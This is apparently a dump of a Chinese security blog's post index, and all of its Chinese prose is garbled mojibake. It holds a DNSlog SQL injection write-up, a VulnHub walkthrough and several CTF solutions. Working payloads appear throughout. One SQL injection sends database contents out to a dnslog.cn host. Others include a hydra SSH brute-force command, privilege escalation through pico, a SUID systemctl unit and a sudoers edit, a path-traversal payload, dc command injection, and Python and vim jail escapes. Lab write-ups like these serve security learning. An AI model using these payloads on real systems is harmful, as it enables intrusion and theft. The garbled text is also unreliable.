·å½“æˆ‘å‘dnsæœåŠ¡å™¨å‘èµ·a.comçš„è§£æè¯·æ±‚æ—¶ï¼ŒDNSlogä¸­ä¼šè®°å½•ä¸‹ä»–ç»™a.comè§£æï¼Œè§£æå€¼ä¸º1.1.1.1ï¼Œè€Œæˆ‘ä»¬è¿™ä¸ªè§£æçš„è®°å½•çš„å€¼å°±æ˜¯æˆ‘ä»¬è¦åˆ©ç”¨çš„åœ°æ–¹ã€‚ è‡ªå·±æ“ä½œä¸€ä¸‹æ‰èƒ½æ›´å¥½çš„ç†è§£ï¼Œé¦–å…ˆåœ¨http://www.dnslog.cn/ä¸Šè·å¾—ä¸€ä¸ªåŸŸåï¼Œç„¶åæˆ‘ä»¬pingä¸€ä¸‹ æˆ‘ä»¬å°†1æ¢æˆåˆ«çš„è¯•è¯• å¯ä»¥çœ‹åˆ°è§£æçš„æ—¥å¿—ä¼šæŠŠ%USERNAME%çš„å€¼ç»™å¸¦å‡ºæ¥ï¼Œå› ä¸ºç³»ç»Ÿåœ¨pingå‘½ä»¤ä¹‹å‰ä¼šå°†%USERNAME%çš„å€¼è§£æå‡ºæ¥ï¼Œç„¶åå†å’ŒåŸŸåæ‹¼æ¥èµ·æ¥ã€‚ DNSlogåˆ©ç”¨sqlæ³¨å…¥ å°±ä»¥sqlç›²æ³¨ä¸ºä¾‹ï¼Œåç«¯æ•°æ®åº“ç”¨çš„mysqlæ•°æ®åº“ï¼Œè¯´ä¸€ä¸‹ç”¨dnslogå›æ˜¾åªèƒ½ç”¨äºwindowsç³»ç»Ÿï¼Œä¸ºä»€ä¹ˆå‘¢ã€‚å› ä¸ºåœ¨åˆ©ç”¨sqlç›²æ³¨è¿›è¡ŒDNSlogå›æ˜¾æ—¶ï¼Œéœ€è¦ç”¨åˆ°load_fileå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¯ä»¥è¿›è¡ŒDNSè¯·æ±‚ã€‚é‚£å’Œåªèƒ½åœ¨windowsä¸Šç”¨æœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°Windowsçš„ä¸€ä¸ªå°Tipsâ€”â€”UNCè·¯å¾„ UNCè·¯å¾„UNCæ˜¯ä¸€ç§å‘½åæƒ¯ä¾‹, ä¸»è¦ç”¨äºåœ¨Microsoft Windowsä¸ŠæŒ‡å®šå’Œæ˜ å°„ç½‘ç»œé©±åŠ¨å™¨. UNCå‘½åæƒ¯ä¾‹æœ€å¤šè¢«åº”ç”¨äºåœ¨å±€åŸŸç½‘ä¸­è®¿é—®æ–‡ä»¶æœåŠ¡å™¨æˆ–è€…æ‰“å°æœºã€‚æˆ‘ä»¬æ—¥å¸¸å¸¸ç”¨çš„ç½‘ç»œå…±äº«æ–‡ä»¶å°±æ˜¯è¿™ä¸ªæ–¹å¼ã€‚ \\abc.xxx\\testè¿™ä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆCONCAT()å‡½æ•°æ‹¼æ¥äº†4ä¸ª\\äº†,åŒæ–œæ è¡¨ç¤ºç½‘ç»œèµ„æºè·¯å¾„å¤šåŠ ä¸¤ä¸ª\\å°±æ˜¯è½¬ä¹‰äº†åæ–œæ ã€‚ é€šè¿‡DNSlogç›²æ³¨éœ€è¦ç”¨çš„load_file()å‡½æ•°ï¼Œæ‰€ä»¥ä¸€èˆ¬å¾—æ˜¯rootæƒé™ã€‚show variables like &#39;%secure%&#39;;æŸ¥çœ‹load_file()å¯ä»¥è¯»å–çš„ç£ç›˜ã€‚ 1ã€å½“secure_file_privä¸ºç©ºï¼Œå°±å¯ä»¥è¯»å–ç£ç›˜çš„ç›®å½•ã€‚ 2ã€å½“secure_file_privä¸ºG:\\ï¼Œå°±å¯ä»¥è¯»å–Gç›˜çš„æ–‡ä»¶ã€‚ 3ã€å½“secure_file_privä¸ºnullï¼Œload_fileå°±ä¸èƒ½åŠ è½½æ–‡ä»¶ã€‚ é€šè¿‡è®¾ç½®my.iniæ¥é…ç½®ã€‚secure_file_priv=â€â€å°±æ˜¯å¯ä»¥load_flieä»»æ„ç£ç›˜çš„æ–‡ä»¶ã€‚ åœ¨mysqlä¸­æ‰§è¡Œå‘½ä»¤select load_file(&#39;\\\\\\\\a.a92pjl.dnslog.cn\\\\a&#39;);å¯ä»¥çœ‹åˆ° å’Œä¹‹å‰çš„ç»“åˆèµ·æ¥æ„é€ è¯­å¥,ç”¨sqlié¶åœºæ¥æµ‹è¯• 12&#x27; and if((select load_file(concat(&#x27;\\\\\\\\&#x27;,(select database()),&#x27;.bhf0ay.dnslog.cn\\\\abc&#x27;))),1,0)--+ å°ç»“DNSlogæ³¨å…¥ä¸æ­¢å¯ä»¥ç”¨äºsqlæ³¨å…¥ï¼Œè¿˜å¯ä»¥ç”¨äºxssï¼Œxxeï¼Œssrfç­‰ï¼Œæ€è·¯æ‰“å¼€ã€‚ å¯ä»¥å‚è€ƒï¼š https://www.cnblogs.com/Xy--1/p/12896599.html","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"},{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"https://lvzhouhang.xyz/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"SYSTEM_FAILURE_1é¶åœº","slug":"SYSTEM-FAILURE-1é¶åœº","date":"2023-09-16T09:57:06.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2023/09/16/SYSTEM-FAILURE-1é¶åœº/","permalink":"https://lvzhouhang.xyz/2023/09/16/SYSTEM-FAILURE-1%E9%9D%B6%E5%9C%BA/","excerpt":"","text":"è·Ÿç€åˆ«äººçš„è§†é¢‘æ‰“ä¸€ä¸‹ã€‚ é¶åœºç›´æ¥å°±ç»™äº†ipåœ°å€ï¼Œç”¨nmapæ‰«ä¸€ä¸‹ç«¯å£ å¼€æ”¾äº†445ç«¯å£,445ç«¯å£é»˜è®¤å¼€æ”¾çš„æ˜¯SMBæœåŠ¡ï¼Œå¯ä»¥åˆ©ç”¨ç›¸å…³çš„å·¥å…·,smbclientã€smbmap ç”¨smbmapæ‰«æå¯ä»¥å‘ç°æœ‰ä¸€ä¸ªåŒ¿åçš„å…±äº«,ç”¨smbclient //ip/anonymousè¿æ¥ï¼Œç©ºå¯†ç ç›´æ¥å›è½¦å°±è¡Œã€‚ æŸ¥çœ‹æ–‡ä»¶å‘ç°åªæœ‰ä¸€ä¸ªshareï¼Œç”¨get shareä¸‹è½½ä¸‹æ¥,æŸ¥çœ‹shareæ–‡ä»¶ã€‚ ç»™äº†Adminå’Œ89492D216D0A212F8ED54FC5AC9D340Bï¼ŒçŒœæµ‹æ˜¯è´¦å·å¯†ç ï¼Œmd5è§£å¯†å¾—qazwsxedcï¼Œç”¨xftpè¿æ¥ï¼Œæˆ–è€…ç”¨lftpè¿æ¥ä¹Ÿå¯ä»¥ã€‚ ftpå¯ä»¥è¿æ¥ï¼Œsshè¯•è¿‡ä¹‹åä¹Ÿå¯ä»¥è¿æ¥ã€‚åˆ©ç”¨linpeas.shæœé›†ä¸€ä¸‹æœ‰æ²¡æœ‰å¯ä»¥ææƒçš„ä¸œè¥¿ å·¥å…·åœ°å€ï¼šhttps://github.com/carlospolop/PEASS-ng ä½†æ˜¯ç”¨æˆ·æƒé™å¤ªä½ï¼Œæ²¡æœ‰åŠæ³•ææƒã€‚ cdåˆ°/Syst3m/F4iluR3,é‡Œé¢æœ‰å¾ˆå¤šæ–‡ä»¶ ä»–ä»¬çš„å¤§å°ä¹Ÿéƒ½å·®ä¸å¤šï¼Œç”¨find ./ -size +1696cå‘½ä»¤æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰ä¸æ­£å¸¸çš„æ–‡ä»¶,ç¡®å®èƒ½æ‰¾åˆ°file0189.txtï¼Œç”¨diffå‘½ä»¤å¯ä»¥æ¯”ä¸€ä¸‹ä»–ä¸å…¶ä»–çš„æ–‡ä»¶æœ‰ä»€ä¹ˆä¸åŒï¼Œä½†æ˜¯å‘ç°æ–‡ä»¶å†…å®¹æ˜¯ä¸€è¡Œçš„ï¼Œæ‰€ä»¥è¦ç»™ä»–ä»¬å˜æˆå•è¡Œçš„ã€‚ cat file0189.txt |xargs -n 1 &gt; /tmp/tmp1 cat file.txt |xargs -n 1 &gt; /tmp/tmp1ç„¶åå†ç”¨diffåˆ¤æ–­ä»–ä»¬æœ‰ä»€ä¹ˆä¸åŒã€‚ å‘ç°åé¢æœ‰ä¸€ä¸²ä¸ä¸€æ ·çš„ï¼Œéœ€è¦è§£å¯†ï¼Œbase62è§£å¯†å¾—åˆ°/Sup3rS3cR37 è¿™ä¸ªæ–‡ä»¶å¤¹åœ¨/var/www/html/area4é‡Œ,ä¸‹è½½useful.txtï¼ŒæŸ¥çœ‹/etc/passwdèƒ½å‘ç°ç”¨æˆ·åï¼Œåˆ©ç”¨hydraè¿›è¡Œçˆ†ç ´ å‘½ä»¤:hydra -L user.txt -P useful.txt ssh://192.168.2.243 -V -I -u -e nsr 123-V æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯-I å¿½ç•¥ç°æœ‰çš„æ¢å¤æ–‡ä»¶ï¼ˆä¸è¦ç­‰å¾… 10 ç§’ï¼‰-e â€œnâ€è¡¨ç¤ºç©ºå¯†ç ï¼Œâ€œsâ€å°è¯•ç™»å½•ä¸ºé€šè¿‡ï¼Œâ€œrâ€å°è¯•åå‘ç™»å½•ä¸ºé€šè¿‡ å¯ä»¥çˆ†ç ´å‡ºæ¥å¯†ç ï¼Œç™»å½•valexç”¨æˆ·ã€‚ sudo -lï¼šåˆ—å‡ºç”¨æˆ·å¯ä»¥æ‰§è¡Œå’Œä¸å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤ã€‚ å¯ä»¥å‘ç°jinç”¨æˆ·å¯ä»¥ç”¨picoã€‚åœ¨ç½‘ä¸Šèƒ½æ‰¾åˆ°nanoçš„ææƒæ–¹å¼ æ‰§è¡Œå‘½ä»¤sudo -u jin /usr/bin/pico ç„¶å 12^R^Xreset; sh 1&gt;&amp;0 2&gt;&amp;0 ç„¶åå°±åˆ°jinè¿™ä¸ªç”¨æˆ·äº†,è¿™ä¸ªæ—¶å€™å°±å¯ä»¥æ‰§è¡Œsystemctläº†ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ç”¨systemctlè¿›è¡Œææƒã€‚ 12345678TF=$(mktemp).serviceecho &#x27;[Service]Type=oneshotExecStart=/bin/sh -c &quot;chmod +s /bin/bash&quot;[Install]WantedBy=multi-user.target&#x27; &gt; $TF./systemctl link $TF./systemctl enable --now $TF æˆ–è€…ä¿®æ”¹sudoers 1echo \\&quot;admin ALL=(ALL:ALL) ALL&quot;&gt;&gt;/etc/sudoers è¯»å–åˆ°root.txt","categories":[{"name":"boot2root","slug":"boot2root","permalink":"https://lvzhouhang.xyz/categories/boot2root/"}],"tags":[{"name":"vulnhub","slug":"vulnhub","permalink":"https://lvzhouhang.xyz/tags/vulnhub/"}]},{"title":"TFCCTF2023","slug":"TFCCTF2023","date":"2023-08-01T02:49:21.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2023/08/01/TFCCTF2023/","permalink":"https://lvzhouhang.xyz/2023/08/01/TFCCTF2023/","excerpt":"","text":"FORENSICSDOWN BADä¿®æ”¹å›¾ç‰‡çš„é«˜åº¦å°±èƒ½å¾—åˆ°flag LISTæ¯”èµ›çš„æ—¶å€™ä¸æ­£ç¡®ç­”æ¡ˆæ’è‚©è€Œè¿‡äº†ï¼Œæˆ‘çœŸè¯¥æ­»å•Šã€‚ é™„ä»¶ç»™äº†ä¸€ä¸ªæµé‡åŒ…ï¼Œè¿½è¸ªTCPæµèƒ½å‘ç°æœ‰ç±»ä¼¼command=echo+%22ZmluZCAvaG9tZS9jdGYgLXR5cGUgZiAtbmFtZSAiRiIgMj4vZGV2L251bGw%3D%22+%7C+base64+-d+%7C+bashè¿™ç§ï¼Œè§£ç æ˜¯ find /home/ctf -type f -name &quot;T&quot; 2&gt;/dev/nullå¤šè§£ç å‡ ä¸ªå¯ä»¥å‘ç°-nameçš„å‚æ•°å°±æ˜¯flag å¯ä»¥ç”¨strings list.pcap|grep commandè¿™ä¸ªä»£ç æ‰¾åˆ°æ‰€æœ‰çš„flagï¼Œç”¨è„šæœ¬è§£ç å¿«ä¸€ç‚¹ï¼Œä¸€ä¸ªä¸€ä¸ªè§£ç ä¹Ÿå¯ä»¥ã€‚ 1234567891011121314import base64traces = open(&quot;./2.txt&quot;, &quot;r&quot;).readlines()base64_commands = []for t in traces: t = t.replace(&quot;command=echo+%22&quot;, &quot;&quot;) t = t.replace(&quot;%22+%7C+base64+-d+%7C+bash&quot;, &quot;&quot;) t = t.replace(&quot;%3D&quot;, &quot;&quot;) t = t.strip() print(base64.b64decode(t + &quot;=&quot; * (len(t) % 4)).decode()[30], end=&quot;&quot;)","categories":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/categories/ctf/"},{"name":"å¤ç›˜","slug":"ctf/å¤ç›˜","permalink":"https://lvzhouhang.xyz/categories/ctf/%E5%A4%8D%E7%9B%98/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/tags/ctf/"}]},{"title":"AmateursCTF2023","slug":"AmateursCTF2023","date":"2023-07-19T08:52:42.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/07/19/AmateursCTF2023/","permalink":"https://lvzhouhang.xyz/2023/07/19/AmateursCTF2023/","excerpt":"","text":"WEBwaiting-an-eternity çœ‹æ–‡ä»¶å¤´ï¼Œè¦ç­‰å¥½é•¿äº‹ä»¶ä¹‹åæ‰ä¼šåˆ·æ–°,ç›´æ¥è®¿é—®åé¢çš„url secretcodeæ˜¯md5è§£å¯†ï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆç”¨ï¼ŒCookieé‡Œæœ‰timeæ˜¯æ—¶é—´æˆ³å°†ä»–æ”¹æˆNANæ˜¾ç¤ºflag funny factorialsé™„ä»¶ç»™äº†ä¸€ä¸ªapp.py å¯æ§ç‚¹åœ¨è¿™é‡Œï¼Œé€šè¿‡æ”¹å˜ä¸»é¢˜å¾—åˆ°flag 123456789101112def filter_path(path): # print(path) path = path.replace(&quot;../&quot;, &quot;&quot;) try: return filter_path(path) except RecursionError: # remove root / from path if it exists if path[0] == &quot;/&quot;: path = path[1:] print(path) return path å°†pathé‡Œé¢çš„../åˆ æ‰äº†ï¼Œå¦‚æœpathå¼€å¤´æ˜¯/ä¼šå¿½è§†æ‰ï¼Œä½†æ˜¯å¦‚æœé€’å½’è¶…è¿‡1000æ¬¡å°±ä¼šè¿›å…¥RecursionErrorç„¶åè®¿é—®æ ¹ç›®å½•ä¸‹çš„flag.txtå°±è¡Œ payload: 1POST /?theme=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../..///flag.txt latekå…³äºlatekå¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« https://www.freebuf.com/articles/security-management/308191.html ç›´æ¥ç”¨\\inputçš„è¯flagè¾“å‡ºä¸å®Œå…¨ï¼Œé—®äº†chatgptå¯ä»¥ç”¨å…¶ä»–æ–¹æ³•è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å– 1234567\\documentclass&#123;article&#125;\\usepackage&#123;verbatim&#125;\\begin&#123;document&#125;Hello, world!\\verbatiminput&#123;/flag.txt&#125;\\end&#123;document&#125; REVvolcanoidaåˆ†æï¼Œå…ˆçœ‹mainå‡½æ•° 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768__int64 __fastcall main(int a1, char **a2, char **a3)&#123; __int64 v4; // rbx __int64 v5; // rbx __int64 v6; // rbx unsigned __int64 v7; // [rsp+8h] [rbp-C8h] BYREF unsigned __int64 v8; // [rsp+10h] [rbp-C0h] BYREF unsigned __int64 v9; // [rsp+18h] [rbp-B8h] BYREF unsigned __int64 v10; // [rsp+20h] [rbp-B0h] FILE *stream; // [rsp+28h] [rbp-A8h] char s[136]; // [rsp+30h] [rbp-A0h] BYREF unsigned __int64 v13; // [rsp+B8h] [rbp-18h] v13 = __readfsqword(0x28u); setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); printf(&quot;Give me a bear: &quot;); v7 = 0LL; __isoc99_scanf(&quot;%llu&quot;, &amp;v7); if ( !sub_12BB(v7) ) &#123; puts(&quot;That doesn&#x27;t look like a bear!&quot;); return 1LL; &#125; else &#123; printf(&quot;Give me a volcano: &quot;); v8 = 0LL; __isoc99_scanf(&quot;%llu&quot;, &amp;v8); if ( (unsigned __int8)sub_13D9(v8) != 1 ) &#123; puts(&quot;That doesn&#x27;t look like a volcano!&quot;); return 1LL; &#125; else &#123; printf(&quot;Prove to me they are the same: &quot;); v9 = 0LL; v10 = 4919LL; __isoc99_scanf(&quot;%llu&quot;, &amp;v9); if ( (v9 &amp; 1) != 0 &amp;&amp; v9 != 1 ) &#123; v4 = sub_1209(v8); if ( v4 == sub_1209(v7) &amp;&amp; (v5 = sub_124D(v8), v5 == sub_124D(v7)) &amp;&amp; (v6 = sub_1430(v10, v8, v9), v6 == sub_1430(v10, v7, v9)) ) &#123; puts(&quot;That looks right to me!&quot;); stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;); fgets(s, 128, stream); puts(s); return 0LL; &#125; else &#123; puts(&quot;Nope that&#x27;s not right!&quot;); return 1LL; &#125; &#125; else &#123; puts(&quot;That&#x27;s not a valid proof!&quot;); return 1LL; &#125; &#125; &#125;&#125; å…ˆçœ‹sub_12BBå’Œsub_13D9è¿™ä¸¤ä¸ª 123456789101112_BOOL8 __fastcall sub_12BB(unsigned __int64 a1)&#123; if ( (a1 &amp; 1) != 0 ) return 0LL; if ( a1 % 3 != 2 ) return 0LL; if ( a1 % 5 != 1 ) return 0LL; if ( a1 % 7 == 3 ) return a1 % 109 == 55; return 0LL;&#125; 123456789101112_BOOL8 __fastcall sub_13D9(unsigned __int64 a1)&#123; unsigned __int64 v2; // [rsp+8h] [rbp-10h] v2 = 0LL; while ( a1 ) &#123; v2 += a1 &amp; 1; a1 &gt;&gt;= 1; &#125; return v2 &gt; 16 &amp;&amp; v2 &lt;= 26;&#125; é€»è¾‘å¾ˆç®€å•ï¼Œå†™è„šæœ¬çˆ†ç ´ä¸€ä¸‹å°±è¡Œ çœ‹åé¢ 123if ( v4 == sub_1209(v7) &amp;&amp; (v5 = sub_124D(v8), v5 == sub_124D(v7)) &amp;&amp; (v6 = sub_1430(v10, v8, v9), v6 == sub_1430(v10, v7, v9)) ) å‰å‡ ä¸ªå®Œå…¨æ²¡ç”¨åªç”¨è€ƒè™‘æœ€åä¸€ä¸ªæ‹¬å·é‡Œçš„å†…å®¹å°±è¡Œã€‚ sub_1430: 12345678910111213141516unsigned __int64 __fastcall sub_1430(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3)&#123; unsigned __int64 v5; // [rsp+10h] [rbp-18h] unsigned __int64 v6; // [rsp+20h] [rbp-8h] v6 = 1LL; v5 = a1 % a3; while ( a2 ) &#123; if ( (a2 &amp; 1) != 0 ) v6 = v5 * v6 % a3; a2 &gt;&gt;= 1; v5 = v5 * v5 % a3; &#125; return v6;&#125; ç›´æ¥å†™è„šæœ¬çˆ†ç ´å°±è¡Œäº† exp: 1234567891011121314151617181920212223242526def check1(a1): if a1 &amp; 1 != 0: return 0 if a1 % 3 != 2: return 0 if a1 % 5 != 1: return 0 if a1 % 7 == 3: return a1 % 109 == 55 return 0def check2(a1): v2 = 0 while a1: v2 += a1 &amp; 1 a1 &gt;&gt;= 1 return 16 &lt; v2 &lt;= 26def s(): for i in range(1,10000000): if check1(i) and check2(i): print(i)def a(): for i in range(1,10): if ((i &amp; 1) != 0 and (i!= 1)): print(i)s() #è¾“å‡ºå‰ä¸¤ä¸ªæ•°a() #è¾“å‡ºç¬¬ä¸‰ä¸ªæ•° bearå’Œvolcanoçš„æ•°å€¼ä¸€æ ·ã€‚ MISCCensorshipç»™äº†ä¸€ä¸ªmain.py 12345678910111213#!/usr/local/bin/pythonfrom flag import flagfor _ in [flag]: while True: try: code = ascii(input(&quot;Give code: &quot;)) if &quot;flag&quot; in code or &quot;e&quot; in code or &quot;t&quot; in code or &quot;\\\\&quot; in code: raise ValueError(&quot;invalid input&quot;) exec(eval(code)) except Exception as err: print(err) å¯ä»¥æ‰§è¡Œpythonçš„å‘½ä»¤,ä½†æ˜¯ä¸èƒ½æœ‰flag,e,tï¼Œflagæ˜¯è¢«å®šä¹‰çš„ä½†æ˜¯printé‡Œæœ‰tæ²¡æœ‰åŠæ³•å›æ˜¾ï¼Œå¯ä»¥ç”¨pythonçš„å†…ç½®å‡½æ•°è·å¾—printã€‚ payload: 1vars(globals()[dir()[2]])[globals()[dir()[2]].__dir__()[42]](globals())","categories":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/tags/ctf/"}]},{"title":"CrewCTF","slug":"CrewCTF","date":"2023-07-11T07:20:40.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/07/11/CrewCTF/","permalink":"https://lvzhouhang.xyz/2023/07/11/CrewCTF/","excerpt":"","text":"WEBsequence_galleryä¸‹è½½é™„ä»¶ 1234567891011121314151617181920212223242526272829303132#main.pyimport osimport sqlite3import subprocessfrom flask import Flask, request, render_templateapp = Flask(__name__)@app.get(&#x27;/&#x27;)def index(): sequence = request.args.get(&#x27;sequence&#x27;, None) if sequence is None: return render_template(&#x27;index.html&#x27;) script_file = os.path.basename(sequence + &#x27;.dc&#x27;) #æ„é€ è„šæœ¬å,å°†sequenceå’Œ.dcå­—ç¬¦ä¸²è¿æ¥èµ·æ¥ï¼Œå¹¶è·å–è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ã€‚ if &#x27; &#x27; in script_file or &#x27;flag&#x27; in script_file: return &#x27;:(&#x27; proc = subprocess.run( #è¿è¡Œdcå‘½ä»¤ [&#x27;dc&#x27;, script_file], capture_output=True, text=True, timeout=1, ) output = proc.stdout return render_template(&#x27;index.html&#x27;, output=output)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=8080) 12345678subprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, capture_output=False, shell=False, cwd=None, timeout=None, check=False, encoding=None, errors=None, text=None, env=None, universal_newlines=None)argsï¼šè¡¨ç¤ºè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚å¿…é¡»æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²å‚æ•°åˆ—è¡¨ã€‚stdinã€stdout å’Œ stderrï¼šå­è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥ã€è¾“å‡ºå’Œé”™è¯¯ã€‚å…¶å€¼å¯ä»¥æ˜¯ subprocess.PIPEã€subprocess.DEVNULLã€ä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ–‡ä»¶æè¿°ç¬¦ã€å·²ç»æ‰“å¼€çš„æ–‡ä»¶å¯¹è±¡æˆ–è€… Noneã€‚subprocess.PIPE è¡¨ç¤ºä¸ºå­è¿›ç¨‹åˆ›å»ºæ–°çš„ç®¡é“ã€‚subprocess.DEVNULL è¡¨ç¤ºä½¿ç”¨ os.devnullã€‚é»˜è®¤ä½¿ç”¨çš„æ˜¯ Noneï¼Œè¡¨ç¤ºä»€ä¹ˆéƒ½ä¸åšã€‚å¦å¤–ï¼Œstderr å¯ä»¥åˆå¹¶åˆ° stdout é‡Œä¸€èµ·è¾“å‡ºã€‚timeoutï¼šè®¾ç½®å‘½ä»¤è¶…æ—¶æ—¶é—´ã€‚å¦‚æœå‘½ä»¤æ‰§è¡Œæ—¶é—´è¶…æ—¶ï¼Œå­è¿›ç¨‹å°†è¢«æ€æ­»ï¼Œå¹¶å¼¹å‡º TimeoutExpired å¼‚å¸¸ã€‚checkï¼šå¦‚æœè¯¥å‚æ•°è®¾ç½®ä¸º Trueï¼Œå¹¶ä¸”è¿›ç¨‹é€€å‡ºçŠ¶æ€ç ä¸æ˜¯ 0ï¼Œåˆ™å¼¹ å‡º CalledProcessError å¼‚å¸¸ã€‚encoding: å¦‚æœæŒ‡å®šäº†è¯¥å‚æ•°ï¼Œåˆ™ stdinã€stdout å’Œ stderr å¯ä»¥æ¥æ”¶å­—ç¬¦ä¸²æ•°æ®ï¼Œå¹¶ä»¥è¯¥ç¼–ç æ–¹å¼ç¼–ç ã€‚å¦åˆ™åªæ¥æ”¶ bytes ç±»å‹çš„æ•°æ®ã€‚shellï¼šå¦‚æœè¯¥å‚æ•°ä¸º Trueï¼Œå°†é€šè¿‡æ“ä½œç³»ç»Ÿçš„ shell æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤ã€‚ åœ¨subprocess.run()ä¸­shellæ²¡ç­‰äºTRUEä½†æ˜¯å®¹æ˜“å—åˆ°å‚æ•°çš„å½±å“ åœ¨kalié‡Œç”¨manå‘½ä»¤çœ‹dcçš„æ–‡æ¡£ ç”¨-eå’Œ!å¯ä»¥æ‰§è¡Œå‘½ä»¤,ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œç”¨å…¶ä»–ç¬¦å·ç»•è¿‡ï¼Œåœ¨æœ€åéœ€è¦åŠ ä¸Š%0aè¡¨ç¤ºè¾“å…¥äº†ENTER payload:?sequence=-e$&#123;IFS&#125;!cat$&#123;IFS&#125;*.txt%0A å¾—åˆ°flag:crew&#123;10 63 67 68 101 107 105 76 85 111 68[dan10!=m]smlmx&#125; æ”¾åˆ°kalié‡Œç”¨dcå‘½ä»¤è½¬æ¢ä¸ºçœŸå®çš„flag","categories":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/categories/ctf/"},{"name":"å¤ç›˜","slug":"ctf/å¤ç›˜","permalink":"https://lvzhouhang.xyz/categories/ctf/%E5%A4%8D%E7%9B%98/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/tags/ctf/"}]},{"title":"UIUCTF2023","slug":"UIUCTF023","date":"2023-07-04T11:58:02.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2023/07/04/UIUCTF023/","permalink":"https://lvzhouhang.xyz/2023/07/04/UIUCTF023/","excerpt":"","text":"MISCvimjail1è¿™é“é¢˜ä¸€è¿æ¥å°±æ˜¯æ’å…¥æ¨¡å¼ï¼Œæƒ³åŠæ³•é€€å‡ºæ’å…¥æ¨¡å¼. 1234567#entry.sh#!/usr/bin/env shchmod -r /flag.txtvim -R -M -Z -u /home/user/vimrc ä»¥åªè¯»ã€æ–‡æœ¬ä¸å¯ä¿®æ”¹ã€é™åˆ¶æ¨¡å¼ã€å¯åŠ¨å¹¶ä¸”ç”¨/home/user/vimrcæ›¿ä»£äº†åŸæœ‰çš„.vimrc 123456789#vimrcset nocompatibleset insertmode# ç¦ç”¨äº†å…¼å®¹æ¨¡å¼ï¼Œå¹¶ä¸”é»˜è®¤å¯åŠ¨æ’å…¥æ¨¡å¼inoremap &lt;c-o&gt; nopeinoremap &lt;c-l&gt; nopeinoremap &lt;c-z&gt; nopeinoremap &lt;c-\\&gt;&lt;c-n&gt; nope# å°†è¿™äº›ç»„åˆé”®è½¬æ¢ä¸ºæ’å…¥å•è¯nope ä½†æ˜¯å¯ä»¥æŒ‰ä¸¤æ¬¡ctrl+\\å†æŒ‰ä¸€æ¬¡ctrl+næ¥ç»•è¿‡ï¼Œç„¶åç”¨:eæ¥è¯»å–flagã€‚ 